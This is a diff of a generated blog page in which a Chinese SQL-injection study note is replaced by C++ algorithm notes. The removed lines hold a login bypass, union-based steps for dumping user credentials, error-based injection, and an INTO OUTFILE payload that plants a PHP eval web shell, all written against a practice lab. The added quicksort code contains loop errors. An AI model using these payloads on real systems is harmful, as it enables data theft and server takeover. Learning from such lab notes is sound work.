@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    sql注入 |  一段崎岖的旅行
+    算法笔记 |  一段崎岖的旅行
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -55,7 +55,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-sql注入"
+  id="post-算法笔记"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -66,22 +66,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  sql注入
+  算法笔记
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/09/04/sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2020-09-04T08:12:16.322Z" itemprop="datePublished">2020-09-04</time>
+      <a href="/2021/01/28/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time datetime="2021-01-28T09:34:14.065Z" itemprop="datePublished">2021-01-28</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">545</span>
+            <span class="post-count">475</span>
         </span>
     </span>
 
@@ -105,28 +105,30 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="sql注入の初见"><a href="#sql注入の初见" class="headerlink" title="sql注入の初见"></a>sql注入の初见</h1><p>首先你要学会数据库的语法和特性。比如一个简单的表单，<img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG%5Cimage-20200904162506105.png" alt="image-20200904162506105"></p>
-<p>在输入正确的账号和密码后，会进入另一个页面，我们可以使用一个特殊的用户“ ‘or 1=1– “ 我们就可以进入了，我们可以看一下代码<img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG%5Cimage-20200904172351374.png" alt="image-20200904172351374"></p>
-<p>我们可以知道sql执行的语句是 </p>
-<p><code>select *from admin where username=&#39;&#39; or 1=1--&#39;and password=&#39;&#39;</code></p>
-<p>可知返回的值<del>恒为真</del> 大于0，自然可以进入。</p>
-<h1 id="MySQL基本注入："><a href="#MySQL基本注入：" class="headerlink" title="MySQL基本注入："></a>MySQL基本注入：</h1><p>1.判断注入类型，表单加上’  在加 ‘and 1=1–+ 和 ’and 1=2–+ 看看</p>
-<p>2.判断列数，用 order ,(为了下一步准备)</p>
-<p>3.判断回显位置，用union select 1,2,3…..，列数具体看（2）。这个是一般由网页回显，不过要输入不存在的表单值</p>
-<p>4.查看当前数据库名 ，将select database()插入会回显的位置，不过要输入不存在的表单值</p>
-<p>5.查看数据库版本，将 select version()插入会回显的位置</p>
-<p>6.列出数据库名，将 select group_concat(schema_name) from information_schema.schemata 插入会回显的位置</p>
-<p>7.列出你要的库的表，将select group_concat(table_name) from information_schema.tables where table_schema=’库名’插入会回显的位置</p>
-<p>8.列出你要的表的字段名，将select group_concat(column_name) from information_schema.columns where table_name=’表名’插入会回显的位置</p>
-<p>9.列出user和password, 将select group_cocat(字段名) from 库名.表名  和 select group_concat(字段名) from 库名.表名 插入会回显的位置即可</p>
-<p>以上一般要注释符 – ，但是空格在url末尾会去掉,用–+，+在URL中有特殊含义为空格，或者可以用– x，x随便，x可以保证空格存在。</p>
-<h1 id="MySQL显错注入："><a href="#MySQL显错注入：" class="headerlink" title="MySQL显错注入："></a>MySQL显错注入：</h1><p>1.updatexml()</p>
-<p>select name from user where id=1 and updatexml(1,concat(‘<del>‘,(select database()),’</del>‘),3);</p>
-<h1 id="MySQL-dump-into-outfile"><a href="#MySQL-dump-into-outfile" class="headerlink" title="MySQL dump into outfile:"></a>MySQL dump into outfile:</h1><p>生成一个php文件，可以用蚁剑连接， 比如构造一个这个</p>
-<p>union select 1,(select group_concat(username) from security.users),’<?php @eval($_POST["aaa"]);?>‘ into outfile ‘D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\data.php’–+</p>
-<p>把’<?php @eval($_POST["aaa"]);?>‘放入data.php中，便于蚁剑连接，aaa就是密码，可以在data.php中看到回显内容</p>
-<h2 id="记录一些绕过姿势"><a href="#记录一些绕过姿势" class="headerlink" title="记录一些绕过姿势"></a>记录一些绕过姿势</h2><h3 id="一、过滤空格"><a href="#一、过滤空格" class="headerlink" title="一、过滤空格"></a>一、过滤空格</h3><p>（1）、/**/</p>
-<p>（2）、（）比如and(1=1)</p>
+  <p><del>学习一些入门算法应该不会很难吧，哈哈(C++)</del></p>
+<h3 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h3><p>假设q[n]是一个整数数组需要排序</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> q[],<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ​ <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    ​ <span class="keyword">int</span> mid = q[l];</span><br><span class="line">    ​ <span class="keyword">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;</span><br><span class="line">    ​ <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        ​ <span class="keyword">do</span> &#123; i++; &#125;</span><br><span class="line">        ​ <span class="keyword">while</span> (q[i] &lt; mid);</span><br><span class="line">        ​ <span class="keyword">do</span> &#123; j++; &#125;</span><br><span class="line">        ​ <span class="keyword">while</span> (q[j] &gt; mid);</span><br><span class="line">        ​ <span class="keyword">if</span> (i &lt; j) swap(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    ​ quicksort(q, l, j); <span class="comment">//这时不能用i-1，因为最后不一定就是i&gt;j也可能是i=j，就可能i-1会比l小</span></span><br><span class="line">    ​ quicksort(q, j + <span class="number">1</span>, r); <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="归并"><a href="#归并" class="headerlink" title="归并"></a>归并</h3><p>​    分两步：递归和合并</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    merge(q, l, mid);<span class="comment">//一开始就要递归</span></span><br><span class="line">    merge(q, mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++)<span class="comment">//把q数组l到r的内容复制到p</span></span><br><span class="line">        p[i] = q[i];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = mid + <span class="number">1</span>, x = l;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<span class="comment">//进行合并，循环条件是两部分没有到端点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] &lt; p[j])<span class="comment">//把的那个放入q中</span></span><br><span class="line">            q[x++] = p[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q[x++] = p[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt;= mid)<span class="comment">//如果一方没到终点则直接放到q后面</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">            q[x++] = p[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">while</span> (j &lt;= r)</span><br><span class="line">            q[x++] = p[j++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="整数二分"><a href="#整数二分" class="headerlink" title="整数二分"></a>整数二分</h3><p>1.从左往右逼近</p>
+<p>解释：1 2 2 2 2 2 3，在这里面找2的话，二分肯定要取1到2，或者是2到3这个区间，但是不可能找到2到2这个区间，所以会失去一些数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">half</span><span class="params">(<span class="keyword">int</span> q[], <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">//找x</span></span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (q[mid] &lt;= x)</span><br><span class="line">            l = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.从右往左逼近</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int half(int q[], int l, int r, int x)</span><br><span class="line">&#123; &#x2F;&#x2F;找x</span><br><span class="line">    int mid ;</span><br><span class="line">    while (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        mid &#x3D; l + r  &gt;&gt; 1;</span><br><span class="line">        if (q[mid] &gt;&#x3D;x)</span><br><span class="line">            r &#x3D; mid;</span><br><span class="line">        else</span><br><span class="line">            l &#x3D; mid+1;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
  
       <!-- reward -->
       
@@ -193,7 +195,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/09/04/sql%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2021/01/28/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -204,19 +206,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/09/08/python%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            python的学习
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/07/26/PHP%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+      <a href="/2020/11/23/xss/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">PHP的学习</div>
+        <div class="article-nav-title">xss</div>
       </a>
     
   </nav>
